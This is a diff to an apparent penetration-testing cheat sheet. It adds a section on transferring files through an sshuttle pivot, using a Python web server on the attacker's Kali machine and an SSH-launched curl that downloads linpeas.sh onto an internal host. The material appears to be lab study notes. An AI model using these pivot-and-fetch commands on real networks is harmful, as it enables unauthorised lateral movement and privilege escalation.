@@ -851,6 +851,12 @@ sshuttle -r sean@10.11.1.251 10.1.1.0/24 #run on your kali machine to proxy traf
 #You can visit the next network as normal and enumerate it as normal.
 #best used for everything else but nmap
 ````
+###### Transfering files via sshuttle
+````
+sshuttle -r sean@10.11.1.251 10.1.1.0/24 #1 Port Foward to our machine
+python3 -m http.server 800 # on our kali machine
+ssh megan@10.1.1.27 curl http://192.168.119.140:800/linpeas.sh -o /tmp/linpeas.sh #2 on our kali machine to dowload files
+````
 #### ssh port foward
 ##### Linux Enviorment
 ````
